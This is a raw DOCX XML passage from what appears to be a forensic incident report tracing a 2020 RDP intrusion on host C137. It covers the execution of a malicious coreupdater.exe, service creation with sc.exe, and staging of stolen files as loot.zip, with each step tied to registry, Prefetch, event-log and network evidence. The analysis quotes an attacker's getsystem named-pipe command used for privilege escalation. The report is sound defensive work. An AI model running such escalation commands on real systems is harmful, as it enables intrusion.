        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:35:54.789286</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational 131 | Microsoft-Windows-RemoteDesktopServices-RdpCoreTS | RDP server accepted a new TCP connection | Connection Type: TCP | 10.42.85.10:62514</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#16805</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13.468385</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4647 | Microsoft-Windows-Security-Auditing | User initiated logoff | LogonId: 0x857E73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39812</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>critical</w:t>
              <w:br/>
              <w:t>RDP logon | {"AuthenticationPackageName":"Negotiate","LogonProcessName":"User32 ","TargetOutboundDomainName":"-","TargetLinkedLogonId":"0x0","LmPackageName":"-","TargetDomainName":"C137","SubjectUserName":"DESKTOP-SDN1RPT$","TargetUserSid":"S-1-5-21-2232410529-1445159330-2725690660-500","IpAddress":"10.42.85.10","KeyLength":0,"SubjectLogonId":"0x3e</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#92</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.347240</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.115:3389 -&gt; 10.42.85.10:62514</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#281</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:36:23.467377</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.10:62514 -&gt; 10.42.85.115:3389</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#284</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Program execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Reviewed Prefetch (196 entries), Amcache files, ShimCache, BAM, UserAssist, PCA (registry_complement), MUICache, SRUM (app resource, network), LNK/JumpLists/RecentDocs, memory psscan/cmdline. Only malicious binary: C:\Windows\System32\coreupdater.exe (SHA1 fd153c66...), executed once at 03:40:49 by C137\Administrator (SID -500) from Explorer in RDP session 3 (UserAssist, Prefetch, Amcache, PCA 03:43:12, SRUM, psscan PID 8324 exit 03:43:10). Interactive cmd.exe 03:41:06 and sc.exe 03:42:42 (service creation) attributed to the same session (F-012). New: collection of mortysmith's sensitive files via Notepad/Photos 03:45:34-03:47:39 and staging as loot.zip (03:46:18, deleted 03:47:09) (F-013). SRUM shows coreupdater network usage in 04:14 and 05:14 slots (333KB/222KB, 170KB/26KB) and PowerShell (ricksanchez) 178KB at 05:14 (F-014). Benign executions documented in note. Timeline T-011..T-013, IOC loot.zip.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-012: Execution attribution: coreupdater.exe, cmd.exe and sc.exe launched interactively by C137\Administrator (SID -500) in RDP session 3</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artifact:amcache (files)</w:t>
              <w:br/>
              <w:t>artifact:prefetch</w:t>
              <w:br/>
              <w:t>artifact:registry (recmd, complementary batch)</w:t>
              <w:br/>
              <w:t>artifact:registry: bam/dam</w:t>
              <w:br/>
              <w:t>artifact:registry: opensavepidlmru</w:t>
              <w:br/>
              <w:t>artifact:registry: userassist</w:t>
              <w:br/>
              <w:t>artifact:srum (application resources)</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</w:t>
              <w:br/>
              <w:t>memory</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T1204.002, T1059.003, T1543.003, T1569.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 22:53:11.065740 → 2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Execution artifacts for C:\Windows\System32\coreupdater.exe (SHA1 fd153c66386ca93ec9993d66a84d6f0d129a3a5c, 7168 bytes, PE64, LinkDate 2010-04-14 22:06:53, no version info):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Administrator NTUSER.DAT OpenSavePidlMRU: "This PC\Downloads\coreupdater.exe" at 03:40:00.69 (file-picker, PickerHost.exe BAM -500 03:40:00.80).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Amcache UnassociatedFileEntries: file key written 2020-09-19 03:40:45.19 (FullPath c:\windows\system32\coreupdater.exe).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Prefetch COREUPDATER.EXE-*.pf (row 22): RunCount 1, LastRun 03:40:49.41; files loaded include \Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-2232410529-1445159330-2725690660-500\... (CryptoAPI key container of the -500 profile).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- UserAssist (Administrator NTUSER.DAT, {CEBFF5CD}) "{System}\coreupdater.exe" runs=1 last 03:40:49.347 = launched from Explorer shell (double-click), preceded by CHXSMARTSCREEN.EXE prefetch 03:40:46.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Memory psscan PID 8324 coreupdater.exe, PPID 4008, SessionId 3, Created 03:40:49, Exited 03:43:10.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Compatibility Assistant Store (Administrator NTUSER.DAT, AppCompatFlags\Compatibility Assistant\Store) value C:\Windows\System32\coreupdater.exe; key LastWrite 03:43:12.37 (consistent with PCA write on process exit at 03:43:10).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- SRUM AppResourceUseInfo: coreupdater.exe, SID S-1-5-21-2232410529-1445159330-2725690660-500, slot 04:14:00, ForegroundCycleTime 409,073,352.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Command shell / service creation in the same session:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- UserAssist "{System}\cmd.exe" + "{Programs}\System Tools\Command Prompt.lnk" runs=1 at 03:41:06.504, focus time 3m35s (interactive Start-menu launch); Prefetch CMD.EXE run 03:41:06.53; BAM -500 cmd.exe last 03:44:45.97; SRUM cmd.exe SID -500 slot 04:14 (cycles 55,318,526).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Prefetch SC.EXE (row 125) RunCount 1, LastRun 03:42:42.66, i.e. same second as System 7045 "coreupdater" (ImagePath C:\Windows\System32\coreupdater.exe, auto start, LocalSystem) at 03:42:42.68.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- CMD.EXE prefetch also records run 03:43:14.99 = 7045 "nehgye" (cmd.exe /c echo nehgye &gt; \\.\pipe\nehgye), i.e. getsystem (already F-009).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Facts from five independent disk artifact families (Prefetch, UserAssist/BAM/PCA in registry hives, Amcache, SRUM) plus memory (psscan) converge: the operator in the RDP session of C137\Administrator (session 3, from 10.42.85.10, see F-006) picked coreupdater.exe from Downloads (Edge save dialog), it was moved to System32 (F-008), launched by double-click from Explorer at 03:40:49, then an interactive Command Prompt was opened at 03:41:06 and sc.exe was run at 03:42:42 to register coreupdater as an auto-start LocalSystem service (exact sc.exe command line is not available: no 4688/Sysmon, cmdscan of conhost PID 728 empty). The coreupdater.exe process exited at 03:43:10 just before the getsystem service at 03:43:14 — consistent with Meterpreter migrating / elevating, although the exact sequence cannot be proven without process telemetry. This finding complements F-008 with user attribution and the cmd/sc execution chain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (13)</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03:40:49.410320</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>COREUPDATER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=157C54BB False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\COREUPDATER.EXE-157C54BB.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.660809</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>SC.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=6C4D4413 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#125</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\SC.EXE-6C4D4413.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:53:11.065740</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>CMD.EXE</w:t>
              <w:br/>
              <w:t>runs=9 hash=BD30981 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\CMD.EXE-0BD30981.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49.347000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: UserAssist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (UserAssist, last)</w:t>
              <w:br/>
              <w:t>{System}\coreupdater.exe</w:t>
              <w:br/>
              <w:t>runs=1 focus=0 focus_time=0d, 0h, 00m, 00s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAssist.csv#39</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:41:06.504000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: UserAssist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (UserAssist, last)</w:t>
              <w:br/>
              <w:t>{System}\cmd.exe</w:t>
              <w:br/>
              <w:t>runs=1 focus=1 focus_time=0d, 0h, 03m, 35s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAssist.csv#41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:45.973107</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: BAM/DAM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (BAM)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\cmd.exe</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-2232410529-1445159330-2725690660-500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_BamDam.csv#41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened/saved via dialog box</w:t>
              <w:br/>
              <w:t>This PC\Downloads\coreupdater.exe</w:t>
              <w:br/>
              <w:t>* mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_OpenSavePidlMRU.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
